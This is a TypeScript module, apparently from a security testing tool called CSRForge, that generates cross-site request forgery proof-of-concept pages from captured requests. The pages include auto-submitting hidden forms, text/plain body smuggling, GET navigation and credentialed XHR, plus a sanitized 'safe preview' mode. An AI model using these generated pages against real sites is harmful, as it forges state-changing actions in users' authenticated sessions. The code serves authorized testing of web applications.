import type { GeneratedPoc } from "@/core/models/generator";
import type { NormalizedRequest, RequestParameter } from "@/core/models/request";

export type CsrfTechnique = "auto" | "urlencoded" | "multipart" | "text" | "xhr";

export function escapeHtml(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function fieldInput(parameter: RequestParameter): string {
  return `      <input type="hidden" name="${escapeHtml(parameter.name)}" value="${escapeHtml(parameter.value)}">`;
}

function submitControl(autoSubmit: boolean): string {
  return autoSubmit ? "" : `      <button type="submit">Submit request</button>`;
}

function autoSubmitScript(enabled: boolean): string {
  if (!enabled) return "";
  return `
    <script>
      document.forms[0].submit();
    </script>`;
}

function htmlDocument(body: string): string {
  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CSRForge CSRF PoC</title>
  </head>
  <body>
${body}
  </body>
</html>
`;
}

function formPoc(request: NormalizedRequest, fields: RequestParameter[], autoSubmit: boolean): string {
  const inputs = fields.map(fieldInput).join("\n");
  const body = `    <form method="${escapeHtml(request.method.toLowerCase())}" action="${escapeHtml(request.target.url)}">
${inputs}
${submitControl(autoSubmit)}
    </form>${autoSubmitScript(autoSubmit)}`;
  return htmlDocument(body);
}

function multipartPoc(request: NormalizedRequest, fields: RequestParameter[], autoSubmit: boolean): string {
  const inputs = fields.map(fieldInput).join("\n");
  const body = `    <form method="post" action="${escapeHtml(request.target.url)}" enctype="multipart/form-data">
${inputs}
${submitControl(autoSubmit)}
    </form>${autoSubmitScript(autoSubmit)}`;
  return htmlDocument(body);
}

function getPoc(request: NormalizedRequest, autoSubmit: boolean): string {
  const body = autoSubmit
    ? `    <script>
      location.href = ${JSON.stringify(request.target.url)};
    </script>
    <noscript>
      <a href="${escapeHtml(request.target.url)}">Open request</a>
    </noscript>`
    : `    <a href="${escapeHtml(request.target.url)}">Open request</a>`;
  return htmlDocument(body);
}

function rawBody(request: NormalizedRequest): string {
  if (request.body.kind === "urlencoded") return request.body.raw;
  if (request.body.kind === "json") return request.body.raw;
  if (request.body.kind === "xml") return request.body.raw;
  if (request.body.kind === "text") return request.body.raw;
  if (request.body.kind === "multipart") return request.body.raw || "";
  return "";
}

function textPlainPoc(request: NormalizedRequest, rawBody: string, autoSubmit: boolean): string {
  const body = `    <form method="post" action="${escapeHtml(request.target.url)}" enctype="text/plain">
      <input type="hidden" name="${escapeHtml(rawBody)}" value="">
${submitControl(autoSubmit)}
    </form>${autoSubmitScript(autoSubmit)}`;
  return htmlDocument(body);
}

function xhrPoc(request: NormalizedRequest): string {
  const body = rawBody(request);
  const contentType =
    request.headers.find((header) => header.name.toLowerCase() === "content-type")?.value ||
    (request.body.kind === "urlencoded" ? "application/x-www-form-urlencoded" : "text/plain");
  const source = `    <button id="send">Send diagnostic request</button>
    <pre id="result">No request sent.</pre>
    <script>
      document.getElementById("send").addEventListener("click", function () {
        var xhr = new XMLHttpRequest();
        xhr.open(${JSON.stringify(request.method)}, ${JSON.stringify(request.target.url)}, true);
        xhr.withCredentials = true;
        xhr.setRequestHeader("Content-Type", ${JSON.stringify(contentType)});
        xhr.onload = function () {
          document.getElementById("result").textContent = "Response status: " + xhr.status;
        };
        xhr.onerror = function () {
          document.getElementById("result").textContent = "Request blocked or failed. Cross-domain reads require CORS permission.";
        };
        xhr.send(${JSON.stringify(body)});
      });
    </script>`;
  return htmlDocument(source);
}

function urlencodedFields(request: NormalizedRequest): RequestParameter[] {
  if (request.body.kind === "urlencoded") return request.body.fields;
  return request.queryParameters;
}

function selectedTechnique(request: NormalizedRequest, technique: CsrfTechnique): Exclude<CsrfTechnique, "auto"> {
  if (technique !== "auto") return technique;
  if (request.method === "POST" && request.body.kind === "urlencoded") return "urlencoded";
  if (request.method === "POST" && request.body.kind === "multipart") return "multipart";
  if (request.method === "POST" && (request.body.kind === "text" || request.body.kind === "json" || request.body.kind === "xml")) return "text";
  return "urlencoded";
}

export function generateCsrfPoc(request: NormalizedRequest, autoSubmit: boolean, technique: CsrfTechnique = "auto"): GeneratedPoc {
  if (request.method === "GET") {
    return {
      id: crypto.randomUUID(),
      technique: autoSubmit ? "GET top-level navigation" : "Manual GET navigation",
      source: getPoc(request, autoSubmit),
      expectedRequest: {
        method: "GET",
        targetUrl: request.target.url,
        browserControlledHeaders: ["Cookie", "User-Agent", "Accept", "Referer"]
      },
      assumptions: ["The target relies on browser credentials such as cookies."],
      limitations: ["This PoC performs a navigation-style request and cannot set custom headers."],
      warnings: [],
      classification: "recommended",
      executionRisk: "state-changing"
    };
  }

  const resolvedTechnique = selectedTechnique(request, technique);

  if (resolvedTechnique === "urlencoded") {
    const fields = urlencodedFields(request);
    return {
      id: crypto.randomUUID(),
      technique: autoSubmit ? "Auto-submit URL-encoded form" : "Manual URL-encoded form",
      source: formPoc(request, fields, autoSubmit),
      expectedRequest: {
        method: "POST",
        targetUrl: request.target.url,
        contentType: "application/x-www-form-urlencoded",
        bodyDescription: `${fields.length} form field(s), duplicate names preserved`,
        browserControlledHeaders: ["Cookie", "User-Agent", "Accept", "Origin", "Referer", "Content-Type"]
      },
      assumptions: ["The target accepts a normal browser form submission."],
      limitations: [
        "Browser-controlled headers cannot be manually set by this PoC.",
        ...(request.body.kind === "urlencoded" ? [] : ["The selected technique changes the original body representation."])
      ],
      warnings: request.body.kind === "urlencoded" ? [] : ["Verify the server accepts the changed form representation."],
      classification: request.body.kind === "urlencoded" ? "recommended" : "alternative",
      executionRisk: "state-changing"
    };
  }

  if (resolvedTechnique === "multipart") {
    const fields = urlencodedFields(request);
    return {
      id: crypto.randomUUID(),
      technique: autoSubmit ? "Auto-submit multipart form" : "Manual multipart form",
      source: multipartPoc(request, fields, autoSubmit),
      expectedRequest: {
        method: "POST",
        targetUrl: request.target.url,
        contentType: "multipart/form-data",
        bodyDescription: `${fields.length} multipart field(s), duplicate names preserved`,
        browserControlledHeaders: ["Cookie", "User-Agent", "Accept", "Origin", "Referer", "Content-Type"]
      },
      assumptions: ["The target accepts browser multipart form submissions."],
      limitations: [
        "The browser chooses the multipart boundary.",
        ...(request.body.kind === "multipart" ? [] : ["The selected technique changes the original body representation."])
      ],
      warnings: request.body.kind === "multipart" ? [] : ["Verify the server accepts the changed multipart representation."],
      classification: request.body.kind === "multipart" ? "recommended" : "alternative",
      executionRisk: "state-changing"
    };
  }

  if (resolvedTechnique === "text") {
    return {
      id: crypto.randomUUID(),
      technique: "POST text/plain form representation",
      source: textPlainPoc(request, rawBody(request), autoSubmit),
      expectedRequest: {
        method: "POST",
        targetUrl: request.target.url,
        contentType: "text/plain",
        bodyDescription: "Body placed into a text/plain form representation",
        browserControlledHeaders: ["Cookie", "User-Agent", "Accept", "Origin", "Referer", "Content-Type"]
      },
      assumptions: ["The target accepts text/plain form submissions."],
      limitations: [
        "This representation may not match the original request body exactly.",
        ...(request.body.kind === "json" ? ["A normal HTML form cannot send application/json exactly."] : [])
      ],
      warnings: ["Verify the server accepts this representation before treating it as a confirmed PoC."],
      classification: request.body.kind === "text" ? "recommended" : "diagnostic-only",
      executionRisk: "state-changing"
    };
  }

  if (resolvedTechnique === "xhr") {
    return {
      id: crypto.randomUUID(),
      technique: "Cross-domain XHR diagnostic",
      source: xhrPoc(request),
      expectedRequest: {
        method: request.method,
        targetUrl: request.target.url,
        contentType:
          request.headers.find((header) => header.name.toLowerCase() === "content-type")?.value ||
          (request.body.kind === "urlencoded" ? "application/x-www-form-urlencoded" : "text/plain"),
        bodyDescription: rawBody(request) ? "Original raw body" : "No body",
        browserControlledHeaders: ["Cookie", "User-Agent", "Accept", "Origin", "Referer"]
      },
      assumptions: ["The browser is allowed to send credentialed cross-origin XHR and the target grants CORS permission."],
      limitations: ["Modern browsers require CORS permission for cross-domain XHR reads and many sends trigger preflight."],
      warnings: ["Diagnostic only. This is not a conventional form-based CSRF PoC."],
      classification: "diagnostic-only",
      executionRisk: "state-changing"
    };
  }

  return {
    id: crypto.randomUUID(),
    technique: "Unsupported request diagnostic",
    source: htmlDocument(`    <p>This request cannot be represented as a conventional browser CSRF form by CSRForge yet.</p>`),
    expectedRequest: {
      method: request.method,
      targetUrl: request.target.url,
      browserControlledHeaders: []
    },
    assumptions: [],
    limitations: ["The method or body type is not currently supported by the Phase 1 PoC generator."],
    warnings: ["Use manual verification."],
    classification: "diagnostic-only",
    executionRisk: "unknown"
  };
}

export function safePreviewSource(poc: GeneratedPoc): string {
  const sanitized = poc.source
    .replace(/action="[^"]*"/g, 'action="about:blank"')
    .replace(/href="https?:\/\/[^"]*"/g, 'href="about:blank"')
    .replace(/<script[\s\S]*?<\/script>/gi, '<div class="disabled-script">Script removed in Safe Preview.</div>')
    .replace(/type="hidden"/g, 'type="text" readonly')
    .replace(/<button type="submit">/g, '<button type="button" disabled>')
    .replace(/location\.href\s*=\s*[^;]+;/g, "location.href = 'about:blank';")
    .replace(/document\.forms\[0\]\.submit\(\);/g, "/* Safe Preview: submission disabled. */");
  return sanitized.replace(
    "<head>",
    `<head>
    <style>
      body { font-family: system-ui, sans-serif; padding: 16px; color: #111827; }
      form { display: grid; gap: 10px; max-width: 760px; }
      input { padding: 8px; border: 1px solid #cbd5e1; border-radius: 6px; font-family: ui-monospace, monospace; }
      button { width: max-content; padding: 8px 12px; }
      .safe-preview-notice, .disabled-script { margin-bottom: 12px; padding: 10px; border: 1px solid #f59e0b; background: #fffbeb; border-radius: 6px; }
    </style>`
  ).replace("<body>", "<body>\n    <div class=\"safe-preview-notice\">Safe Preview - target submission is disabled and target URLs are replaced.</div>");
}
